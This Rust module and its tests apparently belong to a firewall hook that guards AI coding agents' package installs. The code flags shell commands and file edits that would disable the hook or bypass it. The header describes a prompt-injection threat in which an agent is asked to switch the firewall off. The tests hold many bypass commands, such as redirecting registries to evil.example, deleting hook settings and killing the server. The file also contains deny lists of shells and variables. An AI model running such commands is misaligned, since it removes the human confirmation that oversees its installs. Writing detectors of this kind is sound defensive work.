//! Tool calls that would switch Customs off or route installs around it (DESIGN.md
//! section 9.2).
//!
//! The agent the hook guards has a shell, so a prompt injection that wants a package
//! installed can first ask for the firewall to be disabled: a policy change through the
//! API or the policy file, the server stopped, the hook removed from Claude Code's
//! settings, or the package managers pointed back at the public registries. Each comes
//! back as `ask`, so a person confirms it. This is a speed bump, not a sandbox: a command
//! assembled at run time (`base64 -d | sh`) is not visible to any static check.

use std::sync::OnceLock;

use regex::Regex;
use serde_json::Value;

use super::shell::split_commands;

/// Variables that point installers at an index or registry (`customs env` sets them).
const REGISTRY_VARS: &[&str] = &[
    "pip_index_url",
    "pip_extra_index_url",
    "uv_default_index",
    "uv_index_url",
    "uv_index",
    "uv_extra_index_url",
    "pdm_pypi_url",
    "pipenv_pypi_mirror",
    "npm_config_registry",
    "yarn_npm_registry_server",
    "bun_config_registry",
    "yarn_registry",
    // Extra sources pip and uv read next to the index.
    "pip_find_links",
    "uv_find_links",
];

/// Variables that load another configuration file, which can name any registry.
const CONFIG_FILE_VARS: &[&str] = &[
    "npm_config_userconfig",
    "npm_config_globalconfig",
    "pip_config_file",
    "uv_config_file",
    "yarn_rc_filename",
];

/// Variables that move where installers look for their configuration files (the user
/// config under `HOME`, `XDG_CONFIG_HOME` or `APPDATA`; npm's global `$PREFIX/etc/npmrc`).
const CONFIG_DIR_VARS: &[&str] = &["home", "xdg_config_home", "appdata", "npm_config_prefix"];

/// Configuration files where a registry or index URL can be set.
const REGISTRY_FILES: &[&str] = &[
    ".npmrc",
    "pip.conf",
    "pip.ini",
    ".yarnrc",
    ".yarnrc.yml",
    "bunfig.toml",
    "uv.toml",
    // npm's global config (`$PREFIX/etc/npmrc`) and pnpm's settings.
    "npmrc",
    "pnpm-workspace.yaml",
];

/// Configuration files known by their path rather than their name (pnpm's user config).
const REGISTRY_PATHS: &[&str] = &["pnpm/rc"];

/// Words that show a configuration text sets where packages come from.
const SOURCE_KEYS: &[&str] = &["registry", "index", "find-links", "find_links"];

/// Programs that set variables from `NAME=value` arguments.
const DECLARERS: &[&str] = &["export", "declare", "set", "typeset", "readonly", "local"];

/// Shells that run a command line given after `-c` (`/c`, `-Command`): the line is checked
/// as if it had been run directly.
const SHELLS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "pwsh",
    "powershell",
    "cmd",
];

/// Programs that write or remove the files named in their arguments.
const WRITERS: &[&str] = &[
    "tee", "cp", "mv", "rm", "unlink", "shred", "truncate", "dd", "install", "ln", "rsync",
    "sponge", "ed", "ex", "vi", "vim", "nvim", "nano", "emacs", "python", "python3", "node",
    "ruby", "chmod", "chown",
];

/// Leading words that run the rest of the line as the command.
const WRAPPERS: &[&str] = &["sudo", "doas", "command", "exec", "nohup", "time", "nice"];

/// A program's name without its directory or a Windows `.exe`, `.cmd`, `.bat` or `.ps1`
/// suffix (`C:\nodejs\npm.cmd` runs npm).
fn base(word: &str) -> &str {
    let b = word.rsplit(['/', '\\']).next().unwrap_or(word);
    [".exe", ".cmd", ".bat", ".ps1"]
        .iter()
        .find_map(|s| {
            let cut = b.len().checked_sub(s.len())?;
            b.get(cut..)
                .filter(|end| end.eq_ignore_ascii_case(s))
                .map(|_| &b[..cut])
        })
        .unwrap_or(b)
}

/// The program and its arguments, past wrappers, `env` options and variable assignments.
fn program(words: &[String]) -> Option<(&str, &[String])> {
    split_program(words).1
}

/// The variable assignments a command line passes to its program (before it, or behind
/// `env`, `sudo` and the other wrappers), and the program with its arguments.
fn split_program(words: &[String]) -> (Vec<&str>, Option<(&str, &[String])>) {
    let mut assigned = Vec::new();
    let mut i = 0;
    while i < words.len() {
        let w = words[i].as_str();
        let b = base(w);
        if is_assignment(w) {
            assigned.push(w);
            i += 1;
        } else if WRAPPERS.contains(&b) {
            i += 1;
            // `sudo -u USER`, `doas -u USER` and `nice -n N` take a value.
            while i < words.len() && words[i].starts_with('-') {
                i += if matches!(words[i].as_str(), "-u" | "-g" | "-n") {
                    2
                } else {
                    1
                };
            }
        } else if b == "env" {
            i += 1;
            // `env -u VAR` takes a value.
            while i < words.len() && words[i].starts_with('-') {
                i += if words[i] == "-u" { 2 } else { 1 };
            }
        } else {
            return (assigned, Some((b, &words[i + 1..])));
        }
    }
    (assigned, None)
}

/// PowerShell environment assignments, `$env:NAME = value` or `$env:NAME=value`.
fn powershell_env(words: &[String]) -> Option<(&str, &str)> {
    let name = words.first()?;
    let name = name
        .get(..5)
        .filter(|p| p.eq_ignore_ascii_case("$env:"))
        .map(|_| &name[5..])?;
    match name.split_once('=') {
        Some((k, v)) => Some((k, v)),
        None if words.get(1).is_some_and(|w| w == "=") => {
            Some((name, words.get(2).map_or("", String::as_str)))
        }
        None => None,
    }
}

/// `[Environment]::SetEnvironmentVariable('NAME', 'VALUE', ...)` calls in the raw command
/// text (the shell lexer splits them at the parentheses).
fn dotnet_env_sets(command: &str) -> Vec<(String, String)> {
    static RE: OnceLock<Regex> = OnceLock::new();
    let re = RE.get_or_init(|| {
        Regex::new(concat!(
            r#"(?i)SetEnvironmentVariable\s*\(\s*['"]?([A-Za-z_][A-Za-z0-9_]*)['"]?"#,
            r#"\s*,\s*['"]?([^'",)]*)"#
        ))
        .unwrap()
    });
    re.captures_iter(command)
        .map(|c| (c[1].to_string(), c[2].to_string()))
        .collect()
}

/// Variables set by PowerShell cmdlets, `Set-Item env:NAME VALUE` (also `-Path`/`-Value`,
/// `New-Item`, `si`, `ni`), and by Windows `setx`.
fn other_env_sets(words: &[String]) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let Some((p, args)) = program(words) else {
        return out;
    };
    match p.to_ascii_lowercase().as_str() {
        "set-item" | "new-item" | "si" | "ni" => {
            let env_at = args
                .iter()
                .position(|a| a.get(..4).is_some_and(|e| e.eq_ignore_ascii_case("env:")));
            if let Some(i) = env_at {
                let value = args
                    .iter()
                    .position(|a| a.eq_ignore_ascii_case("-value"))
                    .and_then(|v| args.get(v + 1))
                    .or_else(|| args[i + 1..].iter().find(|a| !a.starts_with('-')));
                out.push((args[i][4..].to_string(), value.cloned().unwrap_or_default()));
            }
        }
        "setx" => {
            if let [k, v, ..] = positionals(args).as_slice() {
                out.push((k.to_string(), v.to_string()));
            }
        }
        _ => {}
    }
    out
}

/// The command line a shell runs with `-c` (`/c`, `-Command`), when `words` start one.
fn shell_line(words: &[String]) -> Option<String> {
    let (p, args) = program(words)?;
    if !SHELLS.contains(&p.to_ascii_lowercase().as_str()) {
        return None;
    }
    let i = args.iter().position(|a| {
        let a = a.to_ascii_lowercase();
        matches!(
            a.as_str(),
            "-c" | "/c" | "/k" | "-command" | "-commandwithargs"
        )
    })?;
    let rest = &args[i + 1..];
    // `cmd /c` takes the rest of the line; the others take one argument.
    if p.eq_ignore_ascii_case("cmd") {
        Some(rest.join(" "))
    } else {
        rest.first().cloned()
    }
}

fn is_assignment(w: &str) -> bool {
    w.split_once('=').is_some_and(|(k, _)| {
        !k.is_empty()
            && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
            && !k.starts_with(|c: char| c.is_ascii_digit())
    })
}

fn url_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r#"(?i)\b[a-z][a-z0-9+.-]*://[^\s'"`<>]+"#).unwrap())
}

/// Whether one URL is this Customs server: the server's own host, or a loopback name, on
/// the server's port. Only the parsed host and port count, so the address in a query
/// string, a fragment or userinfo does not.
fn url_is_customs(value: &str, server: &str) -> bool {
    let parse = |s: &str| {
        url::Url::parse(s)
            .or_else(|_| url::Url::parse(&format!("http://{s}")))
            .ok()
    };
    let (Some(v), Some(s)) = (parse(value), parse(server)) else {
        return false;
    };
    let host = |u: &url::Url| u.host_str().map(str::to_ascii_lowercase);
    let (Some(vh), Some(sh)) = (host(&v), host(&s)) else {
        return false;
    };
    v.port_or_known_default() == s.port_or_known_default()
        && (vh == sh || ["localhost", "127.0.0.1", "[::1]"].contains(&vh.as_str()))
}

/// Whether text that sets a registry or index points only at Customs: it names at least
/// one URL, and every URL in it is the Customs server. Comments and other text around the
/// URLs do not count either way.
fn points_at_customs(text: &str, server: &str) -> bool {
    let mut urls = url_re().find_iter(text).map(|m| m.as_str()).peekable();
    urls.peek().is_some() && urls.all(|u| url_is_customs(u, server))
}

/// The text an Edit, Write, MultiEdit, NotebookEdit or Codex patch leaves in the file:
/// new strings and contents, without a patch's removed lines.
fn new_text(tool_input: &Value) -> String {
    let mut out = Vec::new();
    for key in ["content", "new_string", "new_source"] {
        if let Some(s) = tool_input.get(key).and_then(Value::as_str) {
            out.push(s);
        }
    }
    for e in tool_input
        .get("edits")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
    {
        if let Some(s) = e.get("new_string").and_then(Value::as_str) {
            out.push(s);
        }
    }
    out.iter()
        .map(|s| {
            if s.starts_with("*** ") {
                s.lines()
                    .filter(|l| !l.starts_with('-'))
                    .collect::<Vec<_>>()
                    .join("\n")
            } else {
                s.to_string()
            }
        })
        .collect::<Vec<_>>()
        .join("\n")
}

/// `python -m pip ARGS` (also `python3`, `python3.12`, `py`, with interpreter options
/// before `-m`): the module and where its arguments start.
fn python_module(p: &str, args: &[String]) -> Option<(&'static str, usize)> {
    let python = p == "py"
        || p.strip_prefix("python")
            .is_some_and(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'));
    if !python {
        return None;
    }
    let m = args.iter().position(|a| !a.starts_with('-') || a == "-m")?;
    match (
        args.get(m).map(String::as_str),
        args.get(m + 1).map(String::as_str),
    ) {
        (Some("-m"), Some("pip" | "pip3")) => Some(("pip", m + 2)),
        _ => None,
    }
}

/// Positional arguments, past options. A valued option's value counts as positional,
/// which is why callers look at every word after the verb.
fn positionals(args: &[String]) -> Vec<&str> {
    args.iter()
        .map(String::as_str)
        .filter(|a| !a.starts_with('-'))
        .collect()
}

fn policy_write_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(concat!(
            r"(?i)(\bput\b|\bpatch\b|\bpost\b|-[a-z]*X\s*(put|patch|post)|--data|--json",
            r"|--upload-file|--method|(^|\s)-[dT](\s|$|'|\x22))"
        ))
        .unwrap()
    })
}

/// Reasons a shell command would disable or bypass Customs; empty when it would not.
pub fn command_reasons(command: &str, server: &str) -> Vec<String> {
    let cmds = split_commands(command);
    // The raw text keeps redirection targets, which the lexer drops; the lexed words have
    // quotes removed, so `/api/"policy"` reads as written; the raw text without quotes
    // covers a quoted redirection target (`> custom''s.toml`).
    let lower = format!(
        "{command}\n{}\n{}",
        command.replace(['\'', '"', '\\'], ""),
        cmds.iter()
            .map(|c| c.join(" "))
            .collect::<Vec<_>>()
            .join("\n")
    )
    .to_ascii_lowercase();
    let programs: Vec<(&str, &[String])> = cmds.iter().filter_map(|c| program(c)).collect();
    let writes = command.contains('>')
        || programs.iter().any(|(p, args)| {
            WRITERS.contains(p)
                || (*p == "sed" || *p == "perl")
                    && args
                        .iter()
                        .any(|a| a.starts_with("-i") || a == "--in-place" || a == "-pi")
        });
    let mut out = Vec::new();

    if lower.contains("/api/policy") && policy_write_re().is_match(&lower) {
        out.push("changes the Customs policy through its API".to_string());
    }
    if lower.contains("customs.toml") && writes {
        out.push("edits the Customs policy file".to_string());
    }
    if writes {
        if let Some((_, agent)) = AGENT_SETTINGS.iter().find(|(p, _)| lower.contains(p)) {
            out.push(format!(
                "edits {agent}, where the Customs hook is registered"
            ));
        } else if lower.contains(CODEX_CONFIG) && lower.contains("hook") {
            out.push(
                "edits the hooks in Codex settings, where the Customs hook is registered".into(),
            );
        }
    }
    if writes
        && REGISTRY_FILES
            .iter()
            .chain(REGISTRY_PATHS)
            .any(|f| lower.contains(f))
        && SOURCE_KEYS.iter().any(|k| lower.contains(k))
        && !points_at_customs(command, server)
    {
        out.push("changes a package manager's registry or index configuration".to_string());
    }

    let mut dotnet = dotnet_env_sets(command);
    for words in &cmds {
        if let Some(line) = shell_line(words) {
            out.extend(command_reasons(&line, server));
        }
        // Assignments passed to a command, `export`/`declare` (and the like) arguments,
        // and the PowerShell and Windows forms.
        let (prefix, prog) = split_program(words);
        let assigned: Vec<(String, String)> = prefix
            .into_iter()
            .chain(
                prog.filter(|(p, _)| DECLARERS.contains(p))
                    .map(|(_, a)| a.iter().map(String::as_str))
                    .into_iter()
                    .flatten(),
            )
            .filter_map(|w| w.split_once('='))
            .chain(powershell_env(words))
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .chain(other_env_sets(words))
            .chain(std::mem::take(&mut dotnet))
            .collect();
        for (k, v) in &assigned {
            let key = k.to_ascii_lowercase();
            if REGISTRY_VARS.contains(&key.as_str()) && !points_at_customs(v, server) {
                out.push(format!("points {k} away from the Customs proxy"));
            }
            if CONFIG_FILE_VARS.contains(&key.as_str()) {
                out.push(format!(
                    "sets {k}, which loads a configuration file that can name another registry"
                ));
            }
            if CONFIG_DIR_VARS.contains(&key.as_str()) {
                out.push(format!(
                    "sets {k}, which changes where installers read their configuration"
                ));
            }
        }
        let unset_vars: Vec<&String> = match program(words) {
            Some(("unset", args)) => args.iter().collect(),
            _ => Vec::new(),
        };
        let env_u: Vec<&String> = words
            .windows(2)
            .filter(|w| w[0] == "-u")
            .map(|w| &w[1])
            .collect();
        for k in unset_vars.into_iter().chain(env_u) {
            if REGISTRY_VARS.contains(&k.to_ascii_lowercase().as_str()) {
                out.push(format!(
                    "removes {k}, which points installs at the Customs proxy"
                ));
            }
        }

        let Some((p, args)) = program(words) else {
            continue;
        };
        let (p, args) = match python_module(p, args) {
            Some((m, skip)) => (m, &args[skip..]),
            None => (p, args),
        };
        let mentions_customs = args
            .iter()
            .any(|a| a.to_ascii_lowercase().contains("customs"));
        // `config VERB KEY VALUE` with options anywhere (`config set -g registry X`), and
        // npm's `set KEY VALUE` shorthand.
        let pos = positionals(args);
        let config = |names: &[&str]| -> Option<(&str, Vec<String>)> {
            let lower = |r: &[&str]| r.iter().map(|k| k.to_ascii_lowercase()).collect();
            match pos.as_slice() {
                ["set", rest @ ..] if names.contains(&"set") => Some(("set", lower(rest))),
                [c, verb, rest @ ..] if names.contains(c) => Some((*verb, lower(rest))),
                _ => None,
            }
        };
        let values_at_customs = || points_at_customs(&args.join(" "), server);
        match p {
            "npm" | "pnpm" | "yarn" | "bun" => {
                let names: &[&str] = if p == "npm" {
                    &["config", "c", "set"]
                } else {
                    &["config"]
                };
                if let Some((verb, rest)) = config(names) {
                    let changes = matches!(verb, "set" | "delete" | "rm" | "unset" | "edit");
                    let registry = rest.iter().any(|k| k.contains("registry"));
                    if changes && (registry || verb == "edit") && !values_at_customs() {
                        out.push(format!("changes the {p} registry setting"));
                    }
                }
            }
            "pip" | "pip3" => {
                if let Some((verb, rest)) = config(&["config"]) {
                    let changes = matches!(verb, "set" | "unset" | "edit");
                    let index = rest
                        .iter()
                        .any(|k| k.contains("index") || k.contains("find-links"));
                    if changes && (index || verb == "edit") && !values_at_customs() {
                        out.push("changes pip's index setting".to_string());
                    }
                }
            }
            "pkill" | "killall" if mentions_customs => {
                out.push("stops the Customs server".to_string());
            }
            "kill" if lower.contains("customs") => {
                out.push("stops the Customs server".to_string());
            }
            "systemctl" | "service" | "launchctl" | "docker" | "podman"
                if mentions_customs
                    && args.iter().any(|a| {
                        matches!(
                            a.as_str(),
                            "stop"
                                | "kill"
                                | "disable"
                                | "mask"
                                | "rm"
                                | "pause"
                                | "unload"
                                | "bootout"
                                | "down"
                        )
                    }) =>
            {
                out.push("stops the Customs server".to_string());
            }
            _ => {}
        }
    }
    out.sort();
    out.dedup();
    out
}

/// Files where an agent registers the Customs hook (project, user and system scopes).
const AGENT_SETTINGS: [(&str, &str); 5] = [
    (".claude/settings", "Claude Code settings"),
    ("cursor/hooks.json", "Cursor hooks"),
    (".gemini/settings.json", "Gemini CLI settings"),
    ("gemini-cli/settings.json", "Gemini CLI settings"),
    (".codex/hooks.json", "Codex hooks"),
];

/// Codex settings, which may hold hooks (`[hooks]`) among much else, so only edits that
/// mention hooks count.
const CODEX_CONFIG: &str = ".codex/config.toml";

/// Reason an Edit, Write or MultiEdit call on `path` would disable or bypass Customs.
pub fn edit_reason(path: &str, tool_input: &Value, server: &str) -> Option<String> {
    let lower = path.replace('\\', "/").to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or(&lower);
    if name == "customs.toml" {
        return Some("edits the Customs policy file".into());
    }
    if name.ends_with(".json") {
        if let Some((_, agent)) = AGENT_SETTINGS.iter().find(|(p, _)| lower.contains(p)) {
            return Some(format!(
                "edits {agent}, where the Customs hook is registered"
            ));
        }
    }
    let text = tool_input.to_string().to_ascii_lowercase();
    if lower.ends_with(CODEX_CONFIG) && (text.contains("hook") || text.contains("*** delete file"))
    {
        return Some(
            "edits the hooks in Codex settings, where the Customs hook is registered".into(),
        );
    }
    // Judged by the text the edit leaves: replacing a public registry with Customs is
    // fine; removing the Customs line, or adding another URL next to it, is not.
    if (REGISTRY_FILES.contains(&name) || REGISTRY_PATHS.iter().any(|p| lower.ends_with(p)))
        && SOURCE_KEYS.iter().any(|k| text.contains(k))
        && !points_at_customs(&new_text(tool_input), server)
    {
        return Some("changes a package manager's registry or index configuration".into());
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const S: &str = "http://127.0.0.1:7878";

    fn flagged(cmd: &str) -> bool {
        !command_reasons(cmd, S).is_empty()
    }

    #[test]
    fn policy_changes_are_flagged() {
        for c in [
            r#"curl -X PUT http://127.0.0.1:7878/api/policy -d '{"mode":"monitor"}'"#,
            "curl -sXPUT localhost:7878/api/policy -H 'content-type: application/json'",
            "http PUT :7878/api/policy mode=monitor",
            r#"python3 -c "import requests; requests.put('http://localhost:7878/api/policy', json={})""#,
            "sed -i 's/enforce/monitor/' ~/.config/customs/customs.toml",
            "echo 'mode = \"monitor\"' >> customs.toml",
            "rm customs.toml",
            // Quote splitting.
            r#"curl -X PUT "http://127.0.0.1:7878/api/"'policy' -d @p.json"#,
            "echo x > custom''s.toml",
            r#"p"kill" cust"oms"#,
        ] {
            assert!(flagged(c), "{c}");
        }
        for c in [
            "curl -s http://127.0.0.1:7878/api/policy",
            "cat customs.toml",
            "grep mode customs.toml",
        ] {
            assert!(!flagged(c), "{c}");
        }
    }

    #[test]
    fn stopping_the_server_is_flagged() {
        for c in [
            "pkill customs",
            "killall -9 customs",
            "kill $(pgrep -x customs)",
            "sudo systemctl stop customs",
            "docker stop customs",
            "docker compose -p customs down",
        ] {
            assert!(flagged(c), "{c}");
        }
        assert!(!flagged("kill %1"));
        assert!(!flagged("docker stop redis"));
    }

    #[test]
    fn hook_settings_edits_are_flagged() {
        assert!(flagged(
            "jq 'del(.hooks)' .claude/settings.json > /tmp/s && mv /tmp/s .claude/settings.json"
        ));
        assert!(flagged("rm ~/.claude/settings.json"));
        assert!(!flagged("cat .claude/settings.json"));
    }

    #[test]
    fn registry_redirection_is_flagged_unless_it_targets_customs() {
        for c in [
            "export PIP_INDEX_URL=https://pypi.org/simple",
            "unset npm_config_registry",
            "env -u PIP_INDEX_URL pip install requests",
            "npm_config_registry=https://registry.npmjs.org npm install left-pad",
            "export PIP_EXTRA_INDEX_URL=https://mirror.example/simple",
            "npm config set registry https://registry.npmjs.org/",
            "pnpm config delete registry",
            "pip config set global.index-url https://pypi.org/simple",
            "echo 'registry=https://registry.npmjs.org/' > ~/.npmrc",
            // Assignments behind `env` and `sudo`, which pass them to the command.
            "env UV_INDEX_URL=https://evil.example/simple uv pip install requests",
            "env -i PATH=/usr/bin npm_config_registry=https://registry.npmjs.org npm i x",
            "sudo PIP_INDEX_URL=https://pypi.org/simple pip install requests",
            "sudo -u root PIP_INDEX_URL=https://pypi.org/simple pip install requests",
            "nohup env BUN_CONFIG_REGISTRY=https://registry.npmjs.org bun add x",
            // Extra sources that installers read next to the index.
            "PIP_FIND_LINKS=https://evil.example/wheels pip install requests",
            "export UV_FIND_LINKS=https://evil.example/wheels",
            "export YARN_REGISTRY=https://registry.yarnpkg.com",
        ] {
            assert!(flagged(c), "{c}");
        }
        for c in [
            "export PIP_INDEX_URL=http://127.0.0.1:7878/pypi/simple",
            "export npm_config_registry=http://localhost:7878/npm/",
            "npm config set registry http://127.0.0.1:7878/npm/",
            "export PATH=$PATH:/opt/bin",
            "npm config get registry",
            "echo 'save-exact=true' >> .npmrc",
            "pip install requests",
            "env NODE_ENV=production npm run build",
            "sudo PIP_INDEX_URL=http://127.0.0.1:7878/pypi/simple pip install requests",
            "env UV_INDEX_URL=http://localhost:7878/pypi/simple uv sync",
            "sudo -u www-data npm run build",
        ] {
            assert!(!flagged(c), "{c}");
        }
    }

    #[test]
    fn everyday_commands_are_not_flagged() {
        for c in [
            "git status && git diff --stat",
            "cargo build --release 2>&1 | tail -20",
            "npm run build > build.log 2>&1",
            "npm install && npm test",
            "pip install -r requirements.txt",
            "docker build -t app . && docker run --rm app",
            "kill -9 4242",
            "ps aux | grep node",
            "cat ~/.npmrc",
            "python manage.py migrate",
            "curl -X POST https://api.example.com/v1/policy -d '{}'",
            "export NODE_ENV=production",
            "echo $PIP_INDEX_URL",
            "env | grep -i registry",
            "rm -rf node_modules dist",
            "sed -i 's/foo/bar/' src/index.ts",
            "systemctl status customs",
            "uv pip install --index-url http://127.0.0.1:7878/pypi/simple httpx",
        ] {
            assert!(!flagged(c), "{c}: {:?}", command_reasons(c, S));
        }
    }

    #[test]
    fn edits() {
        let none = json!({});
        assert!(edit_reason("/home/u/.config/customs/customs.toml", &none, S).is_some());
        assert!(edit_reason("/repo/.claude/settings.local.json", &none, S).is_some());
        assert!(edit_reason("/repo/.cursor/hooks.json", &none, S).is_some());
        assert!(edit_reason("/home/u/.gemini/settings.json", &none, S).is_some());
        assert!(edit_reason("/repo/.gemini/notes.md", &none, S).is_none());
        assert!(flagged("rm .cursor/hooks.json"));
        assert!(flagged("echo '{}' > /etc/gemini-cli/settings.json"));
        assert!(!flagged("cat .cursor/hooks.json"));
        let npmrc = json!({"content": "registry=https://registry.npmjs.org/\n"});
        assert!(edit_reason("/repo/.npmrc", &npmrc, S).is_some());
        let ok = json!({"content": "registry=http://127.0.0.1:7878/npm/\n"});
        assert!(edit_reason("/repo/.npmrc", &ok, S).is_none());
        let other = json!({"new_string": "save-exact=true"});
        assert!(edit_reason("/repo/.npmrc", &other, S).is_none());
        assert!(edit_reason("/repo/src/main.rs", &none, S).is_none());
    }

    #[test]
    fn customs_address_must_match_exactly() {
        // The Customs address somewhere in the text (a query string, a comment, another
        // URL's userinfo) is not the same as the value pointing at Customs.
        for c in [
            "export PIP_INDEX_URL='https://evil.example/simple?127.0.0.1:7878'",
            "export PIP_INDEX_URL=https://evil.example/simple?u=http://127.0.0.1:7878/",
            "export PIP_INDEX_URL=http://127.0.0.1:7878@evil.example/simple",
            "export npm_config_registry=http://127.0.0.1:78789/npm/",
            "export npm_config_registry=http://localhost.evil.example:7878/npm/",
            "echo 'registry=https://evil.example/' > .npmrc # localhost:7878",
            "echo 'registry=https://evil.example/' > .npmrc # http://127.0.0.1:7878/npm/",
            "npm config set registry https://evil.example/ # http://127.0.0.1:7878",
        ] {
            assert!(flagged(c), "{c}");
        }
        for c in [
            "export PIP_INDEX_URL=http://127.0.0.1:7878/pypi/simple",
            "export npm_config_registry=http://[::1]:7878/npm/",
            "echo 'registry=http://localhost:7878/npm/' > .npmrc",
        ] {
            assert!(!flagged(c), "{c}: {:?}", command_reasons(c, S));
        }

        let npmrc = |s: &str| json!({ "content": s });
        for text in [
            "registry=https://evil.example/\n# localhost:7878\n",
            "registry=https://evil.example/?x=127.0.0.1:7878\n",
        ] {
            assert!(
                edit_reason("/r/.npmrc", &npmrc(text), S).is_some(),
                "{text}"
            );
        }
        // Edits are judged by the text they leave, not the text they replace.
        let fixes = json!({
            "old_string": "registry=https://registry.npmjs.org/",
            "new_string": "registry=http://127.0.0.1:7878/npm/",
        });
        assert!(edit_reason("/r/.npmrc", &fixes, S).is_none());
        let removes = json!({
            "old_string": "registry=http://127.0.0.1:7878/npm/\n",
            "new_string": "",
        });
        assert!(edit_reason("/r/.npmrc", &removes, S).is_some());
        let multi = json!({ "edits": [
            { "old_string": "a", "new_string": "index-url = https://evil.example/simple" },
        ]});
        assert!(edit_reason("/r/pip.conf", &multi, S).is_some());
        // A Codex patch: removed lines are not what the file will say.
        let patch = json!({ "content": concat!(
            "*** Update File: .npmrc\n",
            "-registry=http://127.0.0.1:7878/npm/\n",
            "+registry=https://evil.example/\n",
        )});
        assert!(edit_reason("/r/.npmrc", &patch, S).is_some());
        let patch = json!({ "content": concat!(
            "*** Update File: .npmrc\n",
            "-registry=https://registry.npmjs.org/\n",
            "+registry=http://127.0.0.1:7878/npm/\n",
        )});
        assert!(edit_reason("/r/.npmrc", &patch, S).is_none());
    }

    #[test]
    fn more_registry_rewrites() {
        for c in [
            "npm set registry https://evil.example/",
            "npm config set -g registry https://evil.example/",
            "npm config set --location global registry https://evil.example/",
            "npm c set registry https://evil.example/",
            "npm config set @evil:registry https://evil.example/",
            "yarn config set registry https://evil.example/",
            "python -m pip config set global.index-url https://evil.example/simple",
            "python3 -I -m pip config set global.extra-index-url https://evil.example/simple",
            "pip config --user set global.index-url https://evil.example/simple",
            "pip config set global.find-links https://evil.example/wheels",
            "export NPM_CONFIG_USERCONFIG=/tmp/npmrc",
            "NPM_CONFIG_GLOBALCONFIG=/tmp/npmrc npm i x",
            "PIP_CONFIG_FILE=/tmp/pip.conf pip install x",
            "export UV_CONFIG_FILE=/tmp/uv.toml",
            "YARN_RC_FILENAME=.evilrc yarn add x",
            "$env:PIP_CONFIG_FILE = 'C:\\tmp\\pip.ini'",
            // Windows program names.
            "npm.cmd config set registry https://evil.example/",
            "'C:\\Program Files\\nodejs\\npm.cmd' config set registry https://evil.example/",
            "pip.exe config set global.index-url https://evil.example/simple",
        ] {
            assert!(flagged(c), "{c}");
        }
        for c in [
            "npm set registry http://127.0.0.1:7878/npm/",
            "npm config set -g registry http://127.0.0.1:7878/npm/",
            "python -m pip config set global.index-url http://127.0.0.1:7878/pypi/simple",
            "npm config set save-exact true",
            "python -m pip config list",
            "python -m pip install requests",
            "yarn set version stable",
        ] {
            assert!(!flagged(c), "{c}: {:?}", command_reasons(c, S));
        }
    }
    #[test]
    fn shells_scopes_and_other_config_files_are_flagged() {
        for c in [
            // Extra sources in configuration files.
            "echo 'find-links = https://evil.example/wheels' >> ~/.config/pip/pip.conf",
            r#"echo 'find-links = ["https://evil.example/w"]' >> uv.toml"#,
            // The global npmrc, pnpm's own rc file and its workspace settings.
            "echo 'registry=https://evil.example/' > /usr/local/etc/npmrc",
            "echo 'registry=https://evil.example/' > ~/.config/pnpm/rc",
            "echo 'registry: https://evil.example/' >> pnpm-workspace.yaml",
            // Variables that move where installers read their configuration.
            "HOME=/tmp/evil npm install x",
            "export XDG_CONFIG_HOME=/tmp/evil",
            "export NPM_CONFIG_PREFIX=/tmp/evil",
            r"$env:APPDATA = 'C:\tmp\evil'",
            // Other ways to set a variable.
            "typeset -x PIP_INDEX_URL=https://evil.example/simple",
            "readonly npm_config_registry=https://evil.example/",
            "local PIP_INDEX_URL=https://evil.example/simple",
            "setx NPM_CONFIG_REGISTRY https://evil.example/",
            "[Environment]::SetEnvironmentVariable('NPM_CONFIG_REGISTRY', 'https://evil.example/', 'User')",
            "Set-Item -Path Env:PIP_INDEX_URL -Value https://evil.example/simple",
            "Set-Item env:PIP_INDEX_URL https://evil.example/simple",
            // A shell running a command line of its own.
            "bash -c 'export PIP_INDEX_URL=https://evil.example/simple; pip install x'",
            r#"sh -c "npm config set registry https://evil.example/""#,
            r#"pwsh -Command "$env:NPM_CONFIG_REGISTRY='https://evil.example/'""#,
            "cmd /c set PIP_INDEX_URL=https://evil.example/simple",
        ] {
            assert!(flagged(c), "{c}");
        }
        for c in [
            "bash -c 'npm test'",
            "bash -c 'export PIP_INDEX_URL=http://127.0.0.1:7878/pypi/simple'",
            r"setx PATH C:\bin",
            "readonly LOG_LEVEL=debug",
            "[Environment]::SetEnvironmentVariable('NODE_ENV', 'production', 'User')",
            "Set-Item env:NODE_ENV production",
            "echo 'save-exact=true' >> /usr/local/etc/npmrc",
            "sh -c 'cargo build --release'",
        ] {
            assert!(!flagged(c), "{c}: {:?}", command_reasons(c, S));
        }
        let rc = json!({"content": "registry=https://evil.example/\n"});
        assert!(edit_reason("/home/u/.config/pnpm/rc", &rc, S).is_some());
        assert!(edit_reason("/usr/local/etc/npmrc", &rc, S).is_some());
        let links = json!({"content": "[global]\nfind-links = https://evil.example/w\n"});
        assert!(edit_reason("/r/pip.conf", &links, S).is_some());
        assert!(edit_reason("/r/src/rc", &rc, S).is_none());
    }
}
